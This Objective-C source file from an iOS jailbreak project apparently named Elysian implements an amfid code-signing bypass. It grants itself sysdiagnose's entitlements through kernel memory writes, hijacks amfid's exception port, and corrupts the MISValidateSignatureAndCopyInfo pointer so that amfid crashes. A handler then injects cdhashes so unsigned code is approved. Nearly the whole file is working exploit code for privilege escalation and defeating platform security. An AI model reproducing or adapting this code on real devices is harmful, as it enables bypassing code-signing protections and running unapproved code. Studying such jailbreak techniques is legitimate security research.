//
//  amfidestroyer.m
//  Elysian
//
//  Created by chris  on 5/20/20.
//  Copyright © 2020 chr1s_0x1. All rights reserved.
//

#import <Foundation/Foundation.h>
#include <spawn.h>
#import <sys/stat.h>
#include <pthread.h>
#include <mach-o/fat.h>
#include <mach-o/loader.h>
#import <mach/thread_state.h>
#import <mach/thread_status.h>
#import <mach/thread_info.h>
#include <mach/mach.h>
#import <mach/vm_map.h>
#include <mach/message.h>
#import "jelbrekLib.h"
#import "amfidestroyer.h"
#import "kernel_memory.h"
#import "jbtools.h"
#import "utils.h"
#import "amfiutils.h"
#import "include/cs_blob.h"


pthread_t exceptionThread;
static mach_port_name_t AMFID_ExceptionPort = MACH_PORT_NULL;
uint64_t origAMFID_MISVSACI = 0;
uint64_t amfid_base;

// will handle the amfi exception messages
void* AMFIDExceptionHandler(void* arg) {
    LOG("[handler] Recieving amfid message..");
    mach_msg_header_t *head = malloc(0x4000);
    kern_return_t ret = mach_msg(head, MACH_RCV_MSG | MACH_RCV_LARGE | (UInt32)(MACH_MSG_TIMEOUT_NONE), 0, 0x4000, AMFID_ExceptionPort, 0, 0);
    if(ret != KERN_SUCCESS) {
        LOG("[handler] ERR: Couldn't recieve from: %s", mach_error_string(ret));
        return (void *)1;
    }
    
    LOG("[handler] amfid was called!");
    exception_raise_request* req = (exception_raise_request*)head;
        
    mach_port_t thread_port = req->thread.name;
    mach_port_t task_port = req->task.name;
    exception_raise_reply reply = {0};
    
    arm_thread_state64_t state = {0};
    mach_msg_type_number_t stateCnt = ARM_THREAD_STATE64_COUNT;
    
    ret = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&state, &stateCnt);
    
    if(ret != KERN_SUCCESS) {
        LOG("[handler] ERR: Couldn't get thread state: %s", mach_error_string(ret));
        return (void *)1;
    }
    
    LOG("[handler] Got thread state");
    
    _STRUCT_ARM_THREAD_STATE64 new_state;
    memcpy(&new_state, &state, sizeof(_STRUCT_ARM_THREAD_STATE64));
    
    char* filename = (char*)AmfidRead(new_state.__x[23], 1024);
    uint8_t* code_directory = getCodeDirectory(filename);
    if(!code_directory) {
        LOG("[handler] ERR: Unable to get code directory");
        return (void *)1;
    }
    
    LOG("[handler] Found CodeDirectory");
    
    uint8_t cd_hash[CS_CDHASH_LEN];
    if (parse_superblob(code_directory, cd_hash)) {
        LOG("[handler] ERR: Failed to find cdhash");
        return (void *)1;
    }
    
    LOG("[handler] Found cdhash");
    
    // Patch up cdhash
    ret = mach_vm_write(task_port, new_state.__x[24], (vm_offset_t)&cd_hash, (mach_msg_type_number_t)(CS_CDHASH_LEN));
    
    if(ret != KERN_SUCCESS) {
        LOG("[handler] ERR: Unable to write hash into amfid");
        return (void *)1;
    }
    
    LOG("[handler] Wrote hash into amfid");
    
    AmfidWrite_32bits(state.__x[19], 1);
    
    ret = thread_set_state(thread_port, 6, (thread_state_t)&new_state, (mach_msg_type_number_t)(ARM_THREAD_STATE64_COUNT));
    if(ret != KERN_SUCCESS) {
        LOG("[handler] ERR: Couldn't set new thread state");
        return (void *)1;
    }
    LOG("[handler] Successfully set new thread state");
    
    // Setup reply message
    
    LOG("[handler] Setting up reply message..");

    reply.Head.msgh_bits = req->Head.msgh_bits & (UInt32)(MACH_MSGH_BITS_REMOTE_MASK);
    reply.Head.msgh_size = sizeof(reply);
    reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
    reply.Head.msgh_local_port = MACH_PORT_NULL;
    reply.Head.msgh_id = req->Head.msgh_id + 0x64;
        
    reply.NDR = req->NDR;
    reply.RetCode = KERN_SUCCESS;
        
    ret = mach_msg(&reply.Head,
                   1,
                   (mach_msg_size_t)sizeof(reply),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    mach_port_deallocate(mach_task_self_, thread_port);
    mach_port_deallocate(mach_task_self_, task_port);
    
    if(ret != KERN_SUCCESS) {
        LOG("[handler] ERR: Unable to send reply message: %s", mach_error_string(ret));
        return (void *)1;
        }
    LOG("[handler] Sent reply message..");
    
    // we're finished!
    LOG("[handler] We're done!");
    return NULL;
}

int AmfidSetException(mach_port_t amfidport, void *(exceptionHandler)(void*)) {
    if(!MACH_PORT_VALID(amfidport)) {
        LOG("[exception] ERR: amfid task port given is invalid");
        return 1;
    }
    
    LOG("[exception] Going to replace amfid's exception port..");
    // add an insert right
    mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &AMFID_ExceptionPort);
    mach_port_insert_right(mach_task_self_, AMFID_ExceptionPort, AMFID_ExceptionPort, (mach_msg_type_name_t)(MACH_MSG_TYPE_MAKE_SEND));
    // did we add an insert right?
    if(!MACH_PORT_VALID(AMFID_ExceptionPort)) {
        LOG("[exception] ERR: Couldn't insert a port right");
        mach_port_destroy(mach_task_self_, AMFID_ExceptionPort);
        return 1;
    }
    LOG("[exception] Inserted a port right");
    
    // replace exception port with ours
    kern_return_t ret = task_set_exception_ports(amfidport, (exception_mask_t)(EXC_MASK_BAD_ACCESS), AMFID_ExceptionPort, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
    if(ret != KERN_SUCCESS) {
        LOG("[exception] ERR: Couldn't replace amfid exception port!");
        mach_port_destroy(mach_task_self_, AMFID_ExceptionPort);
        return 1;
    }
    LOG("[exception] Replaced amfid's exception port");
    
    // setup a new thread where to handle the exceptions
    pthread_create(&exceptionThread, NULL, exceptionHandler, NULL);
    LOG("[exception] We're done here, exiting..");
    return 0;
}

pid_t hijacksysdiagnose(uint64_t ourproc) {
    LOG("[sys] Hijacking sysdiagnose..");
    // find sysdiagnose's pid
    pid_t syspid;
    char const *args[] = {"sysdiagnose", NULL};
    posix_spawn(&syspid, "/usr/bin/sysdiagnose", NULL, NULL, (char **)args, NULL);
    // get the proc from syspid
    uint64_t sysproc = proc_of_pid((UInt32)(syspid));
    if(!ADDRISVALID(sysproc)) {
        LOG("[sys] ERR: sysdiagnose proc is invalid");
        return 1;
    }
    LOG("[sys] Got sysdiagnose proc: 0x%llx", sysproc);
    
    // grab sysdiagnose's creds and entitlements
    // was gonna use CredsTool, but it also borrows the creds
    // which we don't need so..
    uint64_t ourcreds = rk64(ourproc + 0x100);
    uint64_t syscred = rk64(sysproc + 0x100);

    let ents = rk64(rk64(ourcreds + 0x78) + 0x8);
    let sysents = rk64(rk64(syscred + 0x78) + 0x8);
    wk64(rk64(ourcreds + 0x78) + 0x8, sysents);
    LOG("[sys] Got sysdiagnose creds, returning..");
    return syspid;
}

int amfidestroyer(UInt32 amfipid, uint64_t ourproc) {
    LOG("[amfid] Let's do this..");
    mach_port_t amfid_task = MACH_PORT_NULL;
    
    if(amfipid == 0) return 1;
    
    // hijack sysdiagnose so we can get the amfi task port
    pid_t syspid = hijacksysdiagnose(ourproc);
    if(syspid == 1) { // hijacksysdiagnose returns 1 if it fails
        LOG("[amfid] ERR: Couldn't get sysdiagnose creds");
        CredsTool(0, 1, NO, NO);
        return 1;
    }
    
    // Grab amfid's task port
    task_for_pid(mach_task_self_, amfipid, &amfid_task);
    if(!MACH_PORT_VALID(amfid_task)) {
        LOG("ERR: Unable to get amfid task port");
        mach_port_destroy(mach_task_self_, amfid_task);
        return 1;
    }
    LOG("[amfid] Got amfid task port: 0x%x", amfid_task);
    
    // for AmfidWrite, AmfidRead etc.
    init_amfid_mem(amfid_task);
    
    // get the load address
    uint64_t amfi_load = binary_load_address(amfid_task);
    if(amfi_load == 0) {
        LOG("[amfid] ERR: Couldn't find amfid load address");
        kill(syspid, SIGKILL);
        CredsTool(0, 1, NO, NO);
        return 1;
    }
    LOG("[amfid] Found amfid load address");
    
    /*-------- now for patching amfi --------*/
    
    LOG("[amfid patch] ?: Applying amfid patches..");
    
    // 1. Set exception handler
    int set = AmfidSetException(amfid_task, AMFIDExceptionHandler);
    if(set != 0) {
        LOG("[amfid patch] ERR: Couldn't set exception handler!");
        kill(syspid, SIGKILL);
        CredsTool(0, 1, NO, NO);
        return 1;
    }
    LOG("[amfid patch] 1/3 - Successfully set exception handler");
    
    // check if we can read MISValidateSignatureAndCopyInfo
    mach_vm_size_t sz;
    kern_return_t kr = mach_vm_read_overwrite(amfid_task, amfi_load+amfid_MISValidateSignatureAndCopyInfo_import_offset, 8, (mach_vm_address_t)&origAMFID_MISVSACI, &sz);
     if(kr != KERN_SUCCESS) {
        LOG("[amfid patch] ERR: Couldn't read MISVSACI");
        kill(syspid, SIGKILL);
        CredsTool(0, 1, NO, NO);
        return 1;
    }
    
    // 2. Make MISVSACI r/w for us
    vm_address_t misvsaci_page = (amfi_load + (UInt64)(amfid_MISValidateSignatureAndCopyInfo_import_offset)) & ~vm_page_mask;
    if(misvsaci_page == 0) {
        LOG("[amfid patch] ERR: MISVSACI page is invalid!");
        kill(syspid, SIGKILL);
        CredsTool(0, 1, NO, NO);
        return 1;
    }                                          // add read/write permission flags
    kr = vm_protect(amfid_task, misvsaci_page, vm_page_size, 0, VM_PROT_READ | VM_PROT_WRITE);
    if(kr != KERN_SUCCESS) {
        LOG("[amfid patch] ERR: Couldn't make MISVSACI r/w");
        kill(syspid, SIGKILL);
        CredsTool(0, 1, NO, NO);
        return 1;
    }
    LOG("[amfid patch] 2/3 - Made MISVSACI page r/w");
    
    // 3. patch up amfid to crash
    AmfidWrite_64bits(amfi_load + amfid_MISValidateSignatureAndCopyInfo_import_offset, 0x4141414141414141);
    LOG("[amfid patch] 3/3 - MISVSACI is now 0x41");
    
    /*---------- End of patch ----------*/
    
    LOG("[amfid] Mission complete, cleaning up..");
    kill(syspid, SIGKILL);
    CredsTool(0, 1, NO, NO);
    return 0;
}
